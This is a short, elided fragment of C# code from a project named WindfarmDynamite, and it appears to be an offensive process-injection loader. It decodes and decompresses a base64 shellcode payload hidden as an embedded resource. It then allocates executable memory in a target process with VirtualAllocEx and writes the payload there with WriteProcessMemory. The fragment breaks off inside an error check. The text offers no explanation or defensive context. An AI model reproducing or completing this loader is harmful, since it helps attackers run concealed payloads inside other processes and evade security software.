...
namespace WindfarmDynamite
{
    class WNFarmDynamite_h
    {
        ...
        {
            string scode = ExtractResource("WindfarmDynamite.Resources.txt");
            byte[] blob = Convert.FromBase64String(scode);
            byte[] CSc = Decompress(blob);
            SC_ALLOC ScStruct = new SC_ALLOC();
            IntPtr rScPointer = VirtualAllocEx(hProc, IntPtr.Zero, (uint)CSc.Length, 0x3000, 0x40);
            ...
            {
                uint BytesWritten = 0;
                Boolean WriteResult = WriteProcessMemory(hProc, rScPointer, CSc, (uint)CSc.Length, ref BytesWritten);
                if (!WriteResult)
                {
